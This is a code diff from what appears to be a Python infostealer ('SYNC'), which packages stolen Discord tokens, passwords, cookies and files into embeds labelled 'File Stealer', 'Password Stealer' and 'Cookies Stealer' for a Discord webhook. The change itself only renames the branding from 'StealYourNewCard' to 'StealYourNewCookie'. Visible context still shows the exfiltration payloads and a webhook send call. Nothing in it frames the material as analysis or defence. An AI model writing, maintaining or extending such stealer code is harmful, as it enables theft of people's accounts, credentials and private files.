@@ -272,7 +272,7 @@ def uploadToken(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "@StealYourNewCard",
+                "text": "@StealYourNewCookie",
                 "icon_url": "https://cdn.discordapp.com/attachments/971769033496076348/1018558042402476143/manny_in_floatie.jpg"
                 },
             "thumbnail": {
@@ -281,7 +281,7 @@ def uploadToken(token, path):
             }
         ],
         "avatar_url": "https://cdn.discordapp.com/attachments/971769033496076348/1018558042402476143/manny_in_floatie.jpg",
-        "username": "StealYourNewCard",
+        "username": "StealYourNewCookie",
         "attachments": []
         }
     # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
@@ -316,7 +316,7 @@ def upload(name, tk=''):
                 "name": "SYNC | File Stealer"
             },
             "footer": {
-                "text": "@StealYourNewCard",
+                "text": "@StealYourNewCookie",
                 "icon_url": "https://cdn.discordapp.com/attachments/971769033496076348/1018558042402476143/manny_in_floatie.jpg"
             }
             }
@@ -355,7 +355,7 @@ def upload(name, tk=''):
                 "name": "SYNC | Password Stealer"
             },
             "footer": {
-                "text": "@StealYourNewCard",
+                "text": "@StealYourNewCookie",
                 "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
             }
             }
@@ -387,7 +387,7 @@ def upload(name, tk=''):
                 "name": "SYNC | Cookies Stealer"
             },
             "footer": {
-                "text": "@StealYourNewCard",
+                "text": "@StealYourNewCookie",
                 "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
             }
             }
